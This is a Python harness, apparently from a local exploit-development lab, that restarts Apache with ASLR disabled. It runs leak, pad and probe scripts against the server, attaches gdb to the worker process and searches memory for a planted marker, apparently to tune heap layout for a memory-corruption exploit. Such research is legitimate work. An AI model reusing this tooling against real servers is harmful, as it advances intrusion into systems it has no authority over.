#!/usr/bin/env python3
import subprocess,time,sys
def sh(c,timeout=60): return subprocess.run(c,shell=True,cwd='/home/debian/php-lab',capture_output=True,text=True,timeout=timeout)
def restart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.3)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.4)
def child():
    out=sh('pgrep -f "^/usr/sbin/apache2 -k start"').stdout.split()
    return out[-1] if len(out)>=2 else None
def trial(P,N1,MARK):
    restart()
    sh("python3 send_a_leak2.py 1001 12 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 send_a_leak3.py 1001 5 39 12 17 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 b_target.py 443 16 983 >/dev/null 2>&1"); time.sleep(0.12)
    w=child()
    if not w: return "no child"
    log=f"/tmp/fm_{P}_{N1}.log"
    sh(f"rm -f {log}")
    sh(f"(sudo -n gdb -q -p {w} -batch -ex 'set $mark = {hex(MARK)}' -x findmark.gdb >{log} 2>&1 &) ; sleep 0.6")
    pads=" ".join(["7:7"]*P)
    sh(f"python3 send_a_pad.py 17 19 3 12 {pads} >/dev/null 2>&1",40); time.sleep(0.2)
    sh(f"python3 send_b_probe.py {N1} 1 {hex(MARK)} >/dev/null 2>&1",30); time.sleep(0.7)
    sh(f"sudo -n pkill -f 'gdb -q -p {w}' >/dev/null 2>&1")
    out=sh(f"grep -E 'TRACKIN|0x7ffff5e[0-9a-f]+' {log}").stdout.strip().splitlines()
    return " | ".join(out[-15:])
MARK=0xdeadbeefcafebabe
for n in [0,100,400]:
    print(f"N1={n} {trial(640,n,MARK)}",flush=True)
